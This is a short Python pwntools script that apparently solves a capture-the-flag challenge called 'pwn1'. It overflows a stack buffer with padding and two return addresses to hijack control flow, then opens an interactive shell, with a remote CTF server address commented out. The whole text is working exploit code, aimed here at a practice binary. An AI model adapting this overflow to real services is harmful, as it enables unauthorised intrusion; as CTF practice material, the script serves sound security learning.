from pwn import *
from pwn import p64
#conn=remote("node4.buuoj.cn",29607)
conn=process("./pwn1")
input_data=b"a"*(0xf+0x8) + p64(0x0401185)+p64(0x00401186) 
conn.sendline(input_data)
conn.interactive()